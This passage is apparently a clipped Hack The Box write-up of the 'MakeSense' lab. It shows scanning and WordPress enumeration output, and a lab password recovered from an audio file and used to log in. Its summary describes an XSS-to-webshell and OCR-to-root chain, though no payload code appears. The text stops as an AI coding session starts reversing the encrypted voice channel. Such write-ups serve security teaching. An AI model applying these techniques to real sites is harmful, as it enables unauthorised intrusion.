---
title: "HTB: MakeSense"
source: https://0xdf.gitlab.io/2026/10/31/htb-makesense.html
source_host: 0xdf.gitlab.io
clip_date: 2026-10-31T23:06:23+08:00
trace_id: 87ef50eb-5de2-447c-a52e-45a84668bbfd
content_hash: e1efb915e32716f65467d396efffa59516aa3d7a044bc094dac2edc6049ef75e
status: synced
tags:
  - CTF
  - 漏洞分析
series: null
feed_source: 0xdf·HTB/逆向
ai_summary: |-
  - **音频信道漏洞：** WordPress 语音通话功能在浏览器端完成转写，服务器仅接收 AES-GCM 加密文本；密钥硬编码在 whisper-wrapper.js 中，攻击者可伪造任意转写内容提交。
  - **凭据泄露路径：** wp-content/uploads 目录可列出，其中音频文件包含用户口述的密码，听写还原后以 Jake 身份登录 /wp-admin。
  - **提权链路：** 伪造转写注入 XSS → 管理员 bot 触发后创建管理员账号 → 通过插件编辑器写入 webshell 获得 www-data shell。
  - **root 提权手法：** 以 root 运行的 OCR Web 应用允许把识别文本保存为任意文件名，构造含 PHP 代码的图片保存为 .php 实现 root 任意命令执行。
  - **Beyond Root 要点：** Chrome 的 Local Network Access 机制对私有 IP 豁免混合内容检查，使 bot 加载 HTTP 脚本；被修改的 Akismet 插件经 index.php 路由即可触发 webshell。
ai_summary_style: key-points
images_status:
  total: 39
  succeeded: 35
  failed_urls:
    - https://www.hackthebox.com/badge/image/336744
    - https://www.hackthebox.com/badge/image/336744
    - https://www.hackthebox.com/badge/image/3008281
    - https://www.hackthebox.com/badge/image/3633873
notion_page_id: 40a75244-d011-81e3-b348-dec7f0832f03
ioc:
  cves:
    - CVE-2023-5692
    - CVE-2026-60137
    - CVE-2026-63030
    - CVE-2026-65640
    - CVE-2026-87902
  cwes: []
  hashes:
    - 1a3b7660d73fc99b5eec6d0d03b2fd2e
    - 8cb52a349a5929af9bb334c9483f006f1e1471e19dda498c70ad2dc4e55df48a
    - 9bd3c384b71e6b45053296afb6c69e5c
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> - **音频信道漏洞：** WordPress 语音通话功能在浏览器端完成转写，服务器仅接收 AES-GCM 加密文本；密钥硬编码在 whisper-wrapper.js 中，攻击者可伪造任意转写内容提交。
> - **凭据泄露路径：** wp-content/uploads 目录可列出，其中音频文件包含用户口述的密码，听写还原后以 Jake 身份登录 /wp-admin。
> - **提权链路：** 伪造转写注入 XSS → 管理员 bot 触发后创建管理员账号 → 通过插件编辑器写入 webshell 获得 www-data shell。
> - **root 提权手法：** 以 root 运行的 OCR Web 应用允许把识别文本保存为任意文件名，构造含 PHP 代码的图片保存为 .php 实现 root 任意命令执行。
> - **Beyond Root 要点：** Chrome 的 Local Network Access 机制对私有 IP 豁免混合内容检查，使 bot 加载 HTTP 脚本；被修改的 Akismet 插件经 index.php 路由即可触发 webshell。

[HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/makesense-cover.webp)

MakeSense starts with a WordPress site for a web agency, with a voice call widget that transcribes recordings in the browser. I’ll find an audio file in a listable uploads directory where a user reads their password aloud, and use it to log in. That user can view contact submissions, so I’ll reverse engineer the encrypted voice channel to submit arbitrary transcriptions, using it for XSS against an administrator bot to create my own admin account and get a shell through the plugin editor. A password in the WordPress config gets me the next user. For root, I’ll abuse an OCR web app running as root that saves recognized text to any filename, drawing PHP into an image to get execution. In Beyond Root I’ll look at the bot that didn’t care about mixed content, and how exactly a backdoored WordPress plugin gets triggered.

## Box Info

[![MakeSense](https://0xdf.gitlab.io/icons/box-makesense.webp)](https://hackthebox.com/machines/makesense)

[MakeSense](https://hackthebox.com/machines/makesense)

Medium

Retire Date 31 Oct 2026

![Linux](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/85d7b9cda22fbe98.png)

OS ![Linux](https://0xdf.gitlab.io/icons/Linux.webp)

Rated Difficulty ![Rated difficulty for MakeSense](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/makesense-diff.webp)

![Rated difficulty for MakeSense](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/581434209519b15b.png)

Radar Graph ![Radar chart for MakeSense](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/makesense-radar.webp)

![Radar chart for MakeSense](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6ca857b6661c1a97.png)

User

00:04:59 [![⚠️ 图片托管失败 · Salzstange](https://www.hackthebox.com/badge/image/336744)](https://app.hackthebox.com/users/336744)

Root

00:09:04 [![⚠️ 图片托管失败 · Salzstange](https://www.hackthebox.com/badge/image/336744)](https://app.hackthebox.com/users/336744)

Creators [![⚠️ 图片托管失败 · SamLyhin](https://www.hackthebox.com/badge/image/3008281)](https://app.hackthebox.com/users/3008281)  
[![⚠️ 图片托管失败 · vldmrrz](https://www.hackthebox.com/badge/image/3633873)](https://app.hackthebox.com/users/3633873)

## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTPS (443):

```bash
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.111.98
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-20 03:29 UTC
Nmap scan report for 10.129.111.98
Host is up, received echo-reply ttl 63 (0.037s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE    SERVICE     REASON
22/tcp   open     ssh         syn-ack ttl 63
80/tcp   filtered http        no-response
443/tcp  open     https       syn-ack ttl 63
8001/tcp filtered vcom-tunnel no-response

Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds
oxdf@hacky$ sudo nmap -p 22,443 -sCV 10.129.111.98
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-20 03:30 UTC
Nmap scan report for 10.129.111.98
Host is up (0.020s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 27:c3:7d:10:17:3b:dc:29:cf:05:83:33:ab:28:d0:38 (ECDSA)
|_  256 a3:46:f2:d7:1f:43:41:31:35:a2:88:31:ff:2a:0b:22 (ED25519)
443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
| ssl-cert: Subject: commonName=makesense.htb
| Not valid before: 2026-05-29T16:37:29
|_Not valid after:  2126-05-05T16:37:29
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title: Agency LLC
| tls-alpn: 
|_  http/1.1
|_http-generator: WordPress 7.0
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.76 seconds
```

It also specifically called out 80 and 8001 as filtered, meaning they respond differently from all the other closed ports.

Based on the [OpenSSH and Apache](https://0xdf.gitlab.io/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 24.04 Noble LTS.

Both of the ports show a TTL of 63, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Linux one hop away.

The TLS certificate on HTTPS shows a `commonName` value of `makesense.htb`.

### Subdomain Fuzz - TCP 443

Given the domain name in the TLS certificate, it’s worth looking at any host-based routing. The default case does return a 200, but there’s also a `Link` header:

```
oxdf@hacky$ curl -k https://10.129.111.98 -I
HTTP/1.1 200 OK
Date: Mon, 19 Oct 2026 21:13:06 GMT
Server: Apache/2.4.58 (Ubuntu)
Link: <https://makesense.htb/index.php?rest_route=/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

```

Trying with a `Host` header shows the same thing:

```
oxdf@hacky$ curl -k https://10.129.111.98 -I -H "Host: makesense.htb"
HTTP/1.1 200 OK
Date: Mon, 19 Oct 2026 21:16:07 GMT
Server: Apache/2.4.58 (Ubuntu)
Link: <https://makesense.htb/index.php?rest_route=/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

```

But it’s a different page:

```
oxdf@hacky$ curl -k https://10.129.111.98/ -s  | md5sum
1a3b7660d73fc99b5eec6d0d03b2fd2e  -
oxdf@hacky$ curl -k https://10.129.111.98/ -s -H "Host: makesense.htb" | md5sum
9bd3c384b71e6b45053296afb6c69e5c  -
```

If I add a path, it does return a 301 redirect:

```yaml
oxdf@hacky$ curl -k https://10.129.111.98/test -I 
HTTP/1.1 301 Moved Permanently
Date: Mon, 19 Oct 2026 21:19:53 GMT
Server: Apache/2.4.58 (Ubuntu)
X-Redirect-By: WordPress
Location: https://10.129.111.98/test/
Content-Type: text/html; charset=UTF-8

```

But the result is the same:

```
oxdf@hacky$ curl -k https://10.129.111.98/test/ -I 
HTTP/1.1 200 OK
Date: Mon, 19 Oct 2026 21:19:56 GMT
Server: Apache/2.4.58 (Ubuntu)
Link: <https://makesense.htb/index.php?rest_route=/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

```

I’ll use `ffuf` to look for subdomains that respond differently:

```
oxdf@hacky$ ffuf -u https://10.129.111.98 -H "Host: FUZZ.makesense.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac -k

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.129.111.98
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.makesense.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

www                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 162ms]
:: Progress: [19966/19966] :: Job [1/1] :: 10 req/sec :: Duration: [0:26:22] :: Errors: 0 ::
```

It finds `www.makesense.htb`. I’ll update my `/etc/hosts` file:

```
10.129.111.98 makesense.htb www.makesense.htb
```

However, `www` ends up redirecting back to `makesense.htb` anyway.

### Website - TCP 443

#### Site

The site is for a website development company:

 ![image-20261019172625729](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261019172625729.webp)![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

All of the links on the page lead to other places on the same page. There is a contact form at the bottom. Submitting the form sends a POST to `/wp-admin/admin-ajax.php`.

At the bottom right corner of the page is a large phone icon:

![image-20261019210030626](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/719b72f28291f15b.png)

![image-20261019210030626](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261019210030626.webp)

Clicking on it pops a “call” overlay:

![image-20261019210054499](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ee5561b7ad748803.png)

![image-20261019210054499](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261019210054499.webp)

Clicking “Call” shows a connection dialog as well as a request for access to the microphone:

![image-20261019210131009](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8c16f99f8be50d6c.png)

![image-20261019210131009](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261019210131009.webp)

This was very flaky. It didn’t always ask for mic permission, and it’s not clear to me how to get it to try to record. Getting a legit submission was nearly impossible through my VM.

Trying to load the page by IP address (even after setting my `hosts` file) causes a popup:

![image-20261019172602271](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/72512bc72f56040a.png)

![image-20261019172602271](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261019172602271.webp)

#### Tech Stack

The HTTP response headers show Apache:

```yaml
HTTP/1.1 200 OK
Date: Mon, 19 Oct 2026 21:36:38 GMT
Server: Apache/2.4.58 (Ubuntu)
Link: <https://makesense.htb/index.php?rest_route=/>; rel="https://api.w.org/"
Vary: Accept-Encoding
Content-Length: 34914
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

That `Link` header is classic WordPress. The REST API is advertising itself. If permalinks were enabled, it would be to `/wp-json/` rather than `/`.

I’ll try to guess a filename that loads the same as `/`, but don’t find anything.

Wappalyzer identifies it as WordPress 7.0:

![image-20261019205841852](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/770d1975ad963343.png)

![image-20261019205841852](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261019205841852.webp)

#### wpscan

I’ll run `wpscan` against the site:

```swift
oxdf@hacky$ wpscan --url https://makesense.htb --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://makesense.htb/ [10.129.111.98]
[+] Started: Tue Oct 20 23:28:47 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://makesense.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://makesense.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://makesense.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://makesense.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 7.0 identified (Insecure, released on 2026-05-20).
 | Found By: Meta Generator (Passive Detection)
 |  - https://makesense.htb/, Match: 'WordPress 7.0'
 | Confirmed By: Atom Generator (Aggressive Detection)
 |  - https://makesense.htb/?feed=atom, <generator uri="https://wordpress.org/" version="7.0">WordPress</generator>
 |
 | [!] 33 vulnerabilities identified:
 |
 | [!] Title: WP < 7.0.2 - Facilitated SQLi
 |     Fixed in: 7.0.2
 |     References:
 |      - https://wpscan.com/vulnerability/82a6c423-547b-4910-aea5-044070b08949
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-60137
 |      - https://wordpress.org/news/2026/07/wordpress-7-0-2-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf
 |
 | [!] Title: WordPress < 7.0.2 - REST API batch-route confusion and SQLi to RCE
 |     Fixed in: 7.0.2
 |     References:
 |      - https://wpscan.com/vulnerability/73310d64-e790-4a78-ab0a-12995b762dba
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-63030
 |      - https://wordpress.org/news/2026/07/wordpress-7-0-2-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q
 |
 | [!] Title: WP < 7.0.3 - Subscriber+ Email Change Confirmation Bypass
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/5ca38157-6fae-4271-a242-2a8584505d1e
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Unauthenticated Blind SSRF
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/e1b9918e-1db9-4d95-be44-3241e52946eb
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Unauthenticated Internal Note Disclosure via Comment Feeds
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/44de300f-c00a-4702-b215-2286b48495f7
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Author+ CSS Injection
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/1e4f9122-22b9-4fa2-913a-6e84d31ec14c
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Unauthenticated Non-Public Post Type Slug Disclosure
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/cc82dffb-16ea-4ae1-a513-e3ada8e574a0
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5692
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Contributor+ Stored XSS in Quick Edits
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/72b68d3f-77a0-47dd-9624-e3631409a352
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Subscriber+ Arbitrary Site Creation on Multisite
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/b9b44801-3260-4f5a-a4cb-74f2de87e0d1
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Contributor+ Stored XSS via Emoji Settings Element
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/3d6b8acc-ea6e-4298-872a-15ac4310be68
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Reflected XSS
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/4594236f-c7ad-41d6-945b-170eaabe2b75
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP 7.0.x - Unauthenticated Password Protected Post Comment Disclosure via Gutenberg Latest Comments Block
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/6850768f-c956-4c2f-8f82-8a3ef9dd2062
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Contributor+ Stored XSS via Gutenberg Post Date Block
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/ab27598f-1994-433b-9c3c-f3c436a788e8
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Contributor+ Stored XSS via Gutenberg Post Content Block
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/0e68351c-aba1-4953-92a3-ebeb72d53847
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.4 - Author+ RCE via PDF Upload
 |     Fixed in: 7.0.4
 |     References:
 |      - https://wpscan.com/vulnerability/5061a614-ee26-422a-b4e8-ec88b96bb3cd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-65640
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-4-release/
 |
 | [!] Title: WP < 7.1.1 - Unauthenticated Stored XSS via Comments
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/aa354358-3a32-4e81-8628-d1aa917b5efa
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Admin+ Stored XSS via Custom Header
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/0e4cc769-a934-4883-9da5-5721133c6305
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Theme Installation via CSRF
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/2624e094-6c88-43b4-812f-26444994737d
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Admin+ Network-Wide Plugin Activation on Multisite
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/0d1f24a1-2161-47cc-8c2d-c3009161153d
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Author+ Path Traversal via Templates REST API
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/eecc3b64-892b-43a8-9da8-457bd311fc55
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Admin+ CSS Injection on Multisite via XML-RPC
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/c16c950c-1a46-4068-8ce9-6e50f9e703b5
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Contributor+ Arbitrary Post Modification
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/e32e8e71-7618-42a7-8a1c-b00750e8581b
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Author+ Unpublished Post Title Disclosure via Attachment Edit Screen
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/a929978a-4c97-4b2a-8933-cc0cb9e0ea46
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Contributor+ Unpublished Post Title Disclosure
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/3da4bdfe-948b-41b6-88fd-7cac9f3b7f73
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Author+ Unauthorized Note Reparenting via REST API
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/bde07f91-aeb2-4875-88f2-4b18e42e331e
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.2 - Unauthenticated LFI via Page Template Resolution
 |     Fixed in: 7.0.6
 |     References:
 |      - https://wpscan.com/vulnerability/507ae4f0-6fb3-4efa-87fc-5b9b1df912c7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-87902
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-2-release/
 |
 | [!] Title: WP < 7.1.3 - Action Injection via Post Status Transition Dynamic Hooks
 |     Fixed in: 7.0.7
 |     References:
 |      - https://wpscan.com/vulnerability/647b00b2-c4c2-4d8c-bda4-f6ab89653866
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.3 - Contributor+ Stored XSS via Imgur Embed
 |     Fixed in: 7.0.7
 |     References:
 |      - https://wpscan.com/vulnerability/56fffd6d-497b-402e-9229-9244d5a41403
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.3 - Unauthenticated Private Post Comment Disclosure via RSS Feed
 |     Fixed in: 7.0.7
 |     References:
 |      - https://wpscan.com/vulnerability/03cc73e1-73bc-450b-8a84-f7303068cbb5
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.3 - Author+ SQLi via WXR Export
 |     Fixed in: 7.0.7
 |     References:
 |      - https://wpscan.com/vulnerability/da37190e-8cc6-463b-926e-43622a7704a5
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.3 - Author+ Sticky Post via REST API
 |     Fixed in: 7.0.7
 |     References:
 |      - https://wpscan.com/vulnerability/5406255d-3d8d-4840-854e-67b346e48dc5
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.3 - Contributor+ DoS via Block Editor URL Details
 |     Fixed in: 7.0.7
 |     References:
 |      - https://wpscan.com/vulnerability/12650b8b-bb55-4706-9baa-3abeb2d4ae6f
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.3 - Unauthenticated Stored XSS via Comment Moderation
 |     Fixed in: 7.0.7
 |     References:
 |      - https://wpscan.com/vulnerability/df1ca42d-b835-4ed6-a634-3f62ac020e77
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/

[+] WordPress theme in use: webagency
 | Location: https://makesense.htb/wp-content/themes/webagency/
 | Style URL: https://makesense.htb/wp-content/themes/webagency/style.css?ver=7.0
 | Style Name: WebAgency
 | Style URI: https://example.com
 | Description: Modern web development agency theme with Tailwind CSS...
 | Author: WebAgency Team
 | Author URI: https://example.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://makesense.htb/wp-content/themes/webagency/style.css?ver=7.0, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <=======================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23

[+] Finished: Tue Oct 20 23:28:55 2026
[+] Requests Done: 183
[+] Cached Requests: 6
[+] Data Sent: 46.293 KB
[+] Data Received: 450.08 KB
[+] Memory used: 271.918 MB
[+] Elapsed time: 00:00:07
```

There is a ton of output here. The most interesting part is:

```
[+] Upload directory has listing enabled: https://makesense.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
```

#### uploads

This directory is listable:

![image-20261020124514990](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/81ca78c8f2103ff5.png)

![image-20261020124514990](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020124514990.webp)

There are several month folders:

![image-20261020124535708](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4282dfc9b2b22356.png)

![image-20261020124535708](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020124535708.webp)

Only the January folder has anything in it:

![image-20261020124600183](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a008f2f6bcd0ac47.png)

![image-20261020124600183](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020124600183.webp)

The audio is not great quality, but it sounds something like:

> Hey this is Jake. I’m testing the new feature and it’s exciting. I’m going there. Oops. Log in. Home. Jake. Clear light nice smooth 4 9 2 3.

I’m not sure why someone would read their login credentials into a voice memo, but it sounds like that’s what Jake did.

## Shell as www-data

### WordPress Access as Jake

#### Login

With a bit of trial and error I can log into `/wp-admin` as jake with the password “ClearLightNiceSmooth4923”:

![image-20261020150736733](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/dea63d2917c767f6.png)

![image-20261020150736733](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020150736733.webp)

This isn’t admin access, so there’s no easy way to get RCE. Most of the menu items are pretty empty, but “Contact Submissions” has an entry for the wave file from above:

![image-20261020152002820](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2c75c62f992e0d99.png)

![image-20261020152002820](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020152002820.webp)

#### Contact Form Submissions

If I submit the contact us form it shows up here:

![image-20261020152413249](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/326125f126be576b.png)

![image-20261020152413249](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020152413249.webp)

#### Audio Submission

I’m not able to get audio submissions to work from my VM, as it doesn’t have a microphone and it seems like too much work to set up. I’ll ask Claude to write a script to submit via this path:

```rust
 ▐▛███▛█   Claude Code v2.1.304
▝▜██████▀  Opus 4.8 · Claude Max
 ▝▝   ▝▝   ~/makesense

❯ I'm looking at a website that records audio and submits it to the database as text. I believe the JS doing this is at https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js. Can you help me make a Python script that can submit via this channel without having a mic on this machine? Don't try to exploit anything. We're just trying to submit via the audio channel.

● I'll help you reverse-engineer the audio submission channel. This is a HackTheBox machine (makesense.htb), so let me start by understanding how the JS works. Let me check the working directory and fetch the whisper wrapper.

Listed 1 directory (ctrl+o to expand)

● makesense.htb resolves to 10.129.111.98. Let me fetch the whisper wrapper JS to understand the channel.

